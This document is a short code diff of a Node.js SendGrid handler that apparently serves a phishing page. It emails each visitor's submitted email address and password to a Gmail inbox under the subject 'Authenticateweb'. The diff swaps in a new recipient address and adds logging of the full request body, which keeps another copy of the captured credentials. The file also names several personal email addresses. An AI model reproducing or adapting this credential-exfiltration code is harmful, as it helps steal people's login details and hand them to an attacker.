@@ -4,11 +4,12 @@ sendgrid.setApiKey(process.env.SENDGRID_API_KEY)
 
 async function sendEmail(req, res){
     
-  
+  console.log(req.body)
+
   try{
     await sendgrid.send(
       {
-        to: 'Richardblatt122@gmail.com',
+        to: 'untamed737@gmail.com',
         from: 'dimeygee1@gmail.com', 
         subject: "Authenticateweb",
         text: 'and easy to do anywhere, even with Node.js',
@@ -32,10 +33,9 @@ async function sendEmail(req, res){
                     <p style="font-weight:bolder;">${req.body.email}</p>
                   </div>
                   <br/>
-                  <br/>
                   <div>
                     <p>Password</p>
-                    <p style="font-weight:bolder;">${req.body.password}</p>
+                    <div style="font-weight:bolder;">${req.body.password}</div>
                   </div>
                 </div>
         </body>
